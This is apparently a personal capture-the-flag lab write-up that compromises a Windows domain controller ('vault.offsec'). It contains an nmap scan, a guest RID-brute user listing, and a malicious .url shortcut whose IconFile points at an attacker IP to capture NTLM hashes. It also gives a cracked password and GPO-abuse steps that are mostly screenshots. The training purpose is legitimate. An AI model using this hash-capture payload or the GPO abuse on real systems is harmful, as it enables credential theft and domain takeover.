
**192.168.153.172**

```sh
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-11 11:10:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-11T11:12:42+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Issuer: commonName=DC.vault.offsec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-13T13:03:26
| Not valid after:  2026-05-15T13:03:26
| MD5:   7d38 14d5 6c77 d7ba 9197 c06a ffb9 62b0
|_SHA-1: b1c3 9bfd 9fd9 7a3d f1f8 0cf7 c50f 357f 5ec4 89dd
|_ssl-date: 2026-01-11T11:13:21+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/11%Time=69638524%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-11T11:12:42
|_  start_date: N/A


```



information Leaks:

`DC.vault.offsec`



- ldapsearch -> KO
- SMB -> KO
	- lets try bruteforcing `id` -> OK
- enum4linux  -> KO


```
r00t@ub3ntu ~/Documents/labs/vault $ nxc smb 192.168.153.172 -u 'guest' -p '' --rid-brute                                                                                         130 ↵
SMB         192.168.153.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.153.172 445    DC               [+] vault.offsec\guest: 
SMB         192.168.153.172 445    DC               498: VAULT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.153.172 445    DC               500: VAULT\Administrator (SidTypeUser)
SMB         192.168.153.172 445    DC               501: VAULT\Guest (SidTypeUser)
SMB         192.168.153.172 445    DC               502: VAULT\krbtgt (SidTypeUser)
SMB         192.168.153.172 445    DC               512: VAULT\Domain Admins (SidTypeGroup)
SMB         192.168.153.172 445    DC               513: VAULT\Domain Users (SidTypeGroup)
SMB         192.168.153.172 445    DC               514: VAULT\Domain Guests (SidTypeGroup)
SMB         192.168.153.172 445    DC               515: VAULT\Domain Computers (SidTypeGroup)
SMB         192.168.153.172 445    DC               516: VAULT\Domain Controllers (SidTypeGroup)
SMB         192.168.153.172 445    DC               517: VAULT\Cert Publishers (SidTypeAlias)
SMB         192.168.153.172 445    DC               518: VAULT\Schema Admins (SidTypeGroup)
SMB         192.168.153.172 445    DC               519: VAULT\Enterprise Admins (SidTypeGroup)
SMB         192.168.153.172 445    DC               520: VAULT\Group Policy Creator Owners (SidTypeGroup)
SMB         192.168.153.172 445    DC               521: VAULT\Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.153.172 445    DC               522: VAULT\Cloneable Domain Controllers (SidTypeGroup)
SMB         192.168.153.172 445    DC               525: VAULT\Protected Users (SidTypeGroup)
SMB         192.168.153.172 445    DC               526: VAULT\Key Admins (SidTypeGroup)
SMB         192.168.153.172 445    DC               527: VAULT\Enterprise Key Admins (SidTypeGroup)
SMB         192.168.153.172 445    DC               553: VAULT\RAS and IAS Servers (SidTypeAlias)
SMB         192.168.153.172 445    DC               571: VAULT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         192.168.153.172 445    DC               572: VAULT\Denied RODC Password Replication Group (SidTypeAlias)
SMB         192.168.153.172 445    DC               1000: VAULT\DC$ (SidTypeUser)
SMB         192.168.153.172 445    DC               1101: VAULT\DnsAdmins (SidTypeAlias)
SMB         192.168.153.172 445    DC               1102: VAULT\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.153.172 445    DC               1103: VAULT\anirudh (SidTypeUser)

```



![[Pasted image 20260111130126.png]]


very insterting we have write permessions in `DocumentsShare`
![[Pasted image 20260111131416.png]]


- lets upload a revshell 
- i cant triggeer it !!

- if we have a write permessions is there a way to Prompt and Cracking the Captured NTLM Hash ? 

@ntlm.url
```
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.45.173\%USERNAME%.icon
IconIndex=1
```


open responder 
`anirudh:SecureHM`


![[Pasted image 20260111143215.png]]


downloaded sharphound


admin is domain admin
**![[Pasted image 20260111144845.png]]

here is our path

![[Pasted image 20260111144948.png]]


we have `WriteOwner` to  default  domain policy 
	from there we have  a GPLink to the domain that contains  container`users`  that contains  `Domain admin` which has  `administrator` as 


![[Pasted image 20260111152852.png]]

![[Pasted image 20260111153723.png]]

![[Pasted image 20260111154253.png]]


`gpupdate /force` trigger gpo changes

![[Pasted image 20260111154336.png]]


![[Pasted image 20260111154424.png]]

### References

https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more
https://medium.com/@ericwsound/gpo-abuse-privilege-escalation-to-local-admin-cb212a1b4fdc